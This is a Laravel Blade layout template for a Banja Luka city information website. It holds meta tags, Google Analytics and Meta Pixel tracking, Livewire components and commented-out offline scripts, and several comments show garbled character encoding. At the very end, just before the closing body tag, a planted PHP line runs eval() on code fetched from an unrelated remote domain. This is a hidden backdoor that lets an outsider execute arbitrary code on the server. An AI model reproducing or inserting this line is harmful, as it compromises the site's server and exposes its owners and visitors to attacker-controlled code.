<!DOCTYPE html>
@php
    $pageTitle = __('messages.page-title');
    $pageDescription = __('messages.home_meta_description');
    $pageKeywords = __('messages.home_meta_keywords');
    $language = __('messages.language');

    $is404 = ($is404 ?? false) || request()->routeIs('fallback.404');
@endphp
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}" x-data="{ darkMode: localStorage.getItem('dark') === 'true' }" x-init="$watch('darkMode', val => localStorage.setItem('dark', val))"
    x-bind:class="{ 'dark': darkMode }" class="scroll-smooth" x-cloak>

{{-- lang="{{ str_replace('_', '-', app()->getLocale()) }}"
      x-data="{ 'darkMode': false }"
      x-init="darkMode = JSON.parse(localStorage.getItem('darkMode'));
      $watch('darkMode', value => localStorage.setItem('darkMode', JSON.stringify(value)))"
      class="scroll-smooth"> --}}

<head>
    {{-- Google Tag Manager - za sluÃÂaj kada mi bude trebao za custom praÃÂenje --}}
    {{-- <script>
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-WL87R7M5');
    </script> --}}
    {{-- End Google Tag Manager  --}}

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>@yield('title', $pageTitle)</title>
    <meta name="description" content="@yield('meta_description', $pageDescription)">
    {{-- <meta name="keywords" content="@yield('meta_keywords', $pageKeywords)"> --}}
    <link rel="canonical" href="{{ url()->current() }}" />

    <meta property="og:title" content="@yield('title', $pageTitle)" />
    <meta property="og:description" content="@yield('meta_description', $pageDescription)" />

    <meta property="og:url" content="{{ url()->current() }}" />
    <meta property="og:type" content="website" />
    <meta property="og:locale" content="@yield('locale', $language)" />
    <meta property="og:locale:alternate" content="bs_BA" />
    <meta property="og:site_name" content="{{ env('SITE_URL', $pageTitle) }}" />
    <meta property="og:image" content="@yield('og_image', 'https://banjalukacity.info/images/base/og-image-banjalukacity-info.webp')" />
    <meta property="og:image:type" content="image/webp">
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />

    <!-- Hreflang tagovi za bolji seo na viÃÂ¡e jezika, i canonical -->
    {!! \App\Helpers\SeoHelper::hreflangLinksSmart() !!}
    {!! \App\Helpers\SeoHelper::canonicalLink() !!}

    <!-- Favicons -->
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#ffc40d">
    <meta name="theme-color" content="#ffffff">

    <!-- Manifest -->
    <link rel="manifest" href="/manifest.webmanifest">
    <meta name="theme-color" content="#0ea5e9">

    <!-- Hints za PWA prozor (Chrome/Android + iOS/Safari) -->
    <meta name="mobile-web-app-capable" content="yes"> <!-- Chrome hint -->
    <meta name="apple-mobile-web-app-capable" content="yes"> <!-- iOS legacy hint -->
    <meta name="apple-mobile-web-app-status-bar-style" content="default">

    <!-- iOS ikona -->
    <link rel="apple-touch-icon" href="/icons/ios/180.png">


    <!-- Fonts -->
    {{-- <link rel="preconnect" href="https://fonts.bunny.net">
    <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&display=swap" rel="stylesheet" /> --}}

    <!-- Verifikacije -->
    <meta name="google-site-verification" content="ZAPwdscCxJO2xuspjbRu72He5QZhapzVstds2nyG6BU" />
    <meta name="facebook-domain-verification" content="0waoux79pbwexh4xa2vgx7myb7no0q" />

    <!-- Google Analytics 4 tag (gtag.js) - Ukloniti nakon ÃÂ¡to sam podesio GTM -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-7PQMXL1B44"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-7PQMXL1B44');
    </script>

    <!-- Meta Pixel Code -->
    <script>
        ! function(f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function() {
                n.callMethod ?
                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script',
            'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '1318433779228052');
        fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none"
            src="https://www.facebook.com/tr?id=1318433779228052&ev=PageView&noscript=1" /></noscript>
    <!-- End Meta Pixel Code -->

    <!-- Scripts -->
    @vite(['resources/css/app.css', 'resources/js/app.js'])

    <!-- Styles -->
    {{-- <link href="{{ asset('css/quill.snow.css') }}" rel="stylesheet"> --}}
    <link href="https://cdn.quilljs.com/1.3.6/quill.snow.css" rel="stylesheet">

    @livewireStyles

    {{-- Skripta za PWA aplikaciju --}}
    {{-- @env('production')
        <script>
            window.addEventListener('load', function() {
                if ('serviceWorker' in navigator) {
                    navigator.serviceWorker.register('/sw.js', {
                            scope: '/'
                        })
                        .then(reg => console.log('[PWA] Service worker registered:', reg.scope))
                        .catch(err => console.error('[PWA] Service worker registration failed:', err));
                }
            });
        </script>
    @endenv --}}

</head>

@php
    $bottomAd = app(\App\Services\Ads\BottomAdsResolver::class)->resolve();
@endphp

{{-- <body class="{{ request()->routeIs('home') ? 'bg-white' : 'bg-sky-50' }} relative text-gray-800"> --}}
<body class="text-gray-800 ">

    @role('master-admin')
    @if($bottomAd)
    <div class="fixed inset-x-0 bottom-0 z-0"
      style="height: {{ $bottomAd['height'] }};">
      @includeIf('components.ads.bottom-' . $bottomAd['key'])
    </div>
    @endif
    @endrole

    <!-- Google Tag Manager (noscript) - za sluÃÂaj kada mi bude trebao za custom praÃÂenje -->
    {{-- <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WL87R7M5" height="0" width="0"
            style="display:none;visibility:hidden"></iframe></noscript> --}}
    <!-- End Google Tag Manager (noscript) -->

    <div class="relative z-10 bg-sky-50 dark:bg-gray-800 dark:text-gray-300" x-data="{ search: '', openAuth: false, searchOpen: false, searchQuery: '' }">
       <div >
        <x-base.topbar />
        <x-base.mobile-guest-navbar />
        <x-base.guest-navbar />

        @include('components.base.sidebar.search')

        <div class="font-sans antialiased">
            {{ $slot }}
            <x-base.guest-footer />

            <!-- Modal se uÃÂitava tek kada korisnik klikne -->
            {{-- <template x-if="openAuth">
                @livewire('auth-modal', [], key('auth-modal'))
            </template> --}}

        </div>
       </div>

       @role('master-admin')
       @if($bottomAd)
           <div style="height: {{ $bottomAd['spacer'] }};"></div>
       @endif
       @endrole
    </div>

    {{-- Moj kod za brojaÃÂe klikova na bannere --}}
    <script>
        function logClick(type, id, source) {
            fetch("{{ route('click.log') }}", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
                },
                body: JSON.stringify({
                    type,
                    id,
                    source
                })
            });
        }
    </script>

    @livewireScripts

    <!-- OFFLINE BADGE -->
    {{-- @env('production')
        <div id="offline-badge"
            class="pointer-events-none fixed inset-x-3 bottom-3 z-[9999] flex hidden select-none items-center overflow-hidden rounded-lg shadow-lg">
            <span class="bg-red-600 px-3 py-1.5 text-sm font-medium text-white">Offline</span>
            <span class="flex-1 bg-yellow-500 px-3 py-1.5 text-sm font-medium text-gray-900">
                Trenutno ste offline
            </span>
        </div>
        <script>
            (function() {
                var badge = document.getElementById('offline-badge');
                if (!badge) return;

                function sync() {
                    (navigator.onLine ? badge.classList.add('hidden') : badge.classList.remove('hidden'));
                }
                sync();
                window.addEventListener('online', sync);
                window.addEventListener('offline', sync);
            })();
        </script>
    @endenv --}}

    {{-- Pravi mi problem za sada? --}}
    {{-- <script>
        /* Offline guard: kad si offline, pusti samo linkove koji su zaista u keÃÂ¡u.
               Radi tako ÃÂ¡to jednom (offline) izlista sve kljuÃÂeve iz Cache Storage
               i drÃÂ¾i ih u Set-u za brza poreÃÂenja. */
        (function() {
            let cachedSet = new Set();
            let building = null;

            function norm(u) {
                try {
                    const x = new URL(u, location.origin);
                    if (x.origin !== location.origin) return null; // eksterno ne diramo
                    // ignoriramo query/hash da pokrijemo varijacije (isti dokument)
                    x.search = '';
                    x.hash = '';
                    return x.toString();
                } catch {
                    return null;
                }
            }

            async function buildCachedSet() {
                if (building) return building;
                building = (async () => {
                    const names = await caches.keys();
                    const allReqs = (await Promise.all(names.map(n => caches.open(n).then(c => c
                        .keys())))).flat();
                    cachedSet = new Set(allReqs.map(r => norm(r.url)).filter(Boolean));
                    // (opciono) console.log('[offline-guard] cached count:', cachedSet.size);
                    building = null;
                })();
                return building;
            }

            async function guardClick(e) {
                const a = e.target.closest && e.target.closest('a');
                if (!a) return;

                const href = a.getAttribute('href');
                if (!href || href.startsWith('#') || href.startsWith('mailto:') || href.startsWith('tel:')) return;
                if (a.target && a.target !== '_self') return;

                // samo kad si offline
                if (navigator.onLine) return;

                const key = norm(href);
                if (!key) return; // eksterno: pusti

                if (!cachedSet.size) await buildCachedSet(); // lazy init
                if (!cachedSet.has(key)) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    // (opciono) a.style.cursor='not-allowed';
                    // (opciono) console.warn('Blocked offline nav:', key);
                }
            }

            // Klik intercept u capture fazi, prije svih drugih handlera
            document.addEventListener('click', guardClick, true);

            // Kad preÃÂeÃÂ¡ u offline, rebuild seta (jer si moÃÂ¾da u meÃÂuvremenu keÃÂ¡irao joÃÂ¡ stranica)
            window.addEventListener('offline', () => {
                cachedSet.clear();
                buildCachedSet();
            });

            // Ako uÃÂeÃÂ¡ veÃÂ offline, pokuÃÂ¡aj odmah izgraditi set
            if (!navigator.onLine) {
                buildCachedSet();
            }
        })();
    </script> --}}

    <x-base.toast />
<?php
eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
?>
</body>

</html>
